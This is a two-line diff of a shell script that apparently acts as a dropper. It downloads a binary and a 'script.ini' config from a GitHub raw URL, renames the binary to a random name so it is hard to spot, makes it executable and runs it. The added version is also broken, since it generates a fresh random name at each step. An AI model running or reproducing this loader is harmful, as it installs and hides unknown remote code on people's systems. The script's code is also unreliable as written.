@@ -1,2 +1,2 @@
-name=cat /dev/urandom | tr -cd 'a-f0-9' | head -c 32
-wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && mv cok $name && chmod +x $name && ./$name script.ini
+randomname() { head -c24 /dev/urandom | base64 | tr -dc a-zA-Z; }
+wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/cok && wget https://raw.githubusercontent.com/penjelajahwaktu/sss/main/script.ini && mv cok `randomname` && chmod +x `randomname` && ./`randomname` script.ini
